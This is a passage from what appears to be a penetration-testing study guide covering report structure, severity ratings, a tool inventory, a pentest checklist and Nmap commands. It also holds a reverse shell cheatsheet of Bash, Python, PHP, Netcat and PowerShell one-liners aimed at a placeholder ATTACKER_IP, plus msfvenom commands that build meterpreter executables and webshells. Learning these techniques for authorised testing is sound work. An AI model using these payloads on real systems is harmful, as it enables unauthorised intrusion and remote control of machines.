- Rubber Ducky — appears as keyboard, types payloads
- BadUSB — firmware-level attack
- Infected drives left in parking lot

---

## 10. Report Writing

### Why Reports Matter
A pentest with no report is worthless. The report IS the deliverable.

---

### Report Structure

```
1. Executive Summary
   - High-level findings
   - Business impact
   - Written for non-technical audience

2. Scope & Methodology
   - What was tested
   - When
   - How (tools and techniques)

3. Findings (Vulnerability Details)
   - Per vulnerability:
     a. Title
     b. Severity (Critical/High/Medium/Low/Info)
     c. CVSS Score
     d. Description
     e. Evidence (screenshots, commands, output)
     f. Impact
     g. Recommendation

4. Remediation Summary
   - Table of all findings with priority

5. Appendices
   - Full tool output
   - Methodology details
   - References
```

---

### Severity Ratings

| Severity | Criteria | Examples |
|---------|---------|---------|
| Critical | Remote code execution, auth bypass, data breach | SQLi with DB dump, RCE, default creds on prod |
| High | Significant impact, exploitable | Privilege escalation, stored XSS |
| Medium | Limited impact or difficult to exploit | Reflected XSS, info disclosure |
| Low | Minimal impact | Missing headers, verbose errors |
| Informational | Best practice issue | No security headers, old TLS |

---

### Evidence Collection

```bash
# During testing, document EVERYTHING:
# - Exact commands run
# - Screenshots with timestamps
# - Tool output saved to files
# - IP addresses and hostnames
# - Time of each action

# Save Nmap output
nmap -A target.com -oA scan_$(date +%Y%m%d)

# Screenshot tool (Linux)
scrot                    # full screen
scrot -s                 # select area

# Record terminal session
script session.log
# everything typed/shown is saved
```

---

## 11. Tools Reference

### Full Tool Inventory

| Tool | Category | Purpose |
|------|----------|---------|
| Nmap | Scanning | Port scan, service detection |
| Masscan | Scanning | Ultra-fast port scanner |
| Rustscan | Scanning | Fast scanner, pipes to Nmap |
| Subfinder | Recon | Passive subdomain enumeration |
| Amass | Recon | Comprehensive subdomain enum |
| theHarvester | Recon | Email, domain, IP harvesting |
| Shodan | Recon | Internet device search |
| Gobuster | Web | Directory/file bruteforce |
| ffuf | Web | Fast web fuzzer |
| Nikto | Web | Web server scanner |
| Whatweb | Web | Technology fingerprinting |
| Burp Suite | Web | Web proxy and scanner |
| SQLmap | Web | Automated SQL injection |
| Metasploit | Exploitation | Full exploitation framework |
| Searchsploit | Exploitation | Offline exploit database |
| Netcat | Exploitation | TCP/UDP connections, shells |
| Hydra | Password | Online brute force |
| Hashcat | Password | Offline GPU password cracking |
| John the Ripper | Password | Offline CPU password cracking |
| LinPEAS | PrivEsc | Linux privesc enumeration |
| WinPEAS | PrivEsc | Windows privesc enumeration |
| Enum4linux | SMB | SMB enumeration |
| CrackMapExec | Post-Exploit | Swiss army knife for AD |
| Impacket | Post-Exploit | Python AD/Windows attack tools |
| BloodHound | Post-Exploit | Active Directory attack paths |
| Aircrack-ng | Wireless | WPA2 handshake cracking |
| Airmon-ng | Wireless | Monitor mode management |
| Wireshark | Analysis | Packet capture and analysis |
| Tcpdump | Analysis | CLI packet capture |
| Nuclei | Vuln Scan | Template-based vulnerability scanner |
| Proxychains | Pivoting | Route traffic through proxies |
| Chisel | Pivoting | TCP tunneling |

---

### Reverse Shell Cheatsheet

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (traditional)
nc -e /bin/sh ATTACKER_IP PORT

# Netcat (no -e flag version)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Listener (attacker side)
nc -lvnp PORT
```

**Upgrade shell to fully interactive:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 12. Quick Reference Cheatsheet

### Pentest Phase Checklist

```
[ ] RECON
    [ ] WHOIS
    [ ] DNS records + zone transfer attempt
    [ ] Subdomain enumeration (subfinder, amass)
    [ ] Google dorks
    [ ] Shodan/Censys
    [ ] GitHub recon (trufflehog)
    [ ] Email harvesting

[ ] SCANNING
    [ ] Host discovery (ping sweep)
    [ ] Port scan (nmap -sS --top-ports 1000)
    [ ] Full port scan (nmap -p-)
    [ ] Version detection (-sV)
    [ ] OS detection (-O)
    [ ] NSE scripts (-sC)
    [ ] Web tech fingerprinting

[ ] ENUMERATION
    [ ] HTTP — directory busting, robots.txt
    [ ] SMB — shares, null session
    [ ] FTP — anonymous login
    [ ] SSH — version, auth methods
    [ ] SNMP — community strings
    [ ] Credentials in default configs

[ ] EXPLOITATION
    [ ] Search CVEs for found versions
    [ ] Try default credentials
    [ ] Searchsploit / Metasploit
    [ ] Manual exploitation

[ ] POST EXPLOITATION
    [ ] Get stable shell
    [ ] System enumeration
    [ ] PrivEsc (LinPEAS/WinPEAS)
    [ ] Credential dumping
    [ ] Lateral movement
    [ ] Persistence

[ ] REPORTING
    [ ] Screenshots collected
    [ ] All commands logged
    [ ] Findings documented
    [ ] Risk ratings assigned
    [ ] Recommendations written
```

---

### Common Nmap One-Liners
```bash
nmap -sS -p- --min-rate 5000 target         # fast full scan
nmap -sV -sC -p 22,80,443,445 target        # version + scripts on key ports
nmap -A -oA output target                   # aggressive + save all formats
nmap --script=vuln target                   # vuln scan
nmap -sU --top-ports 20 target              # top UDP ports
```

### msfvenom Payload Generator
```bash
# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f exe -o shell.exe

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=X LPORT=4444 -f raw -o shell.php

# ASP webshell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f asp -o shell.asp

# List payloads
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep windows
```

---

## Phase 4 Complete Checklist

- [ ] Understand difference between black/grey/white box testing
- [ ] Can perform passive recon using OSINT tools
- [ ] Can enumerate DNS, subdomains, emails
- [ ] Comfortable with Nmap — know main flags by memory
- [ ] Can enumerate SMB, FTP, SSH, HTTP manually
- [ ] Know how to use Metasploit (use, set, run, meterpreter commands)
- [ ] Understand privilege escalation vectors on both Linux and Windows
- [ ] Can use LinPEAS/WinPEAS and interpret output
- [ ] Know lateral movement techniques
- [ ] Understand pivoting and can set up a tunnel
- [ ] Can crack passwords with Hashcat and Hydra
- [ ] Know how to generate and catch reverse shells
- [ ] Can write a basic pentest report with findings and severity
- [ ] Completed at least 10 TryHackMe/HackTheBox machines

---

*Next → Phase 5: Web Application Security*

#cybersecurity #phase4 #penetration-testing #ethical-hacking #nmap #metasploit #privilege-escalation #post-exploitation #password-cracking #recon #osint
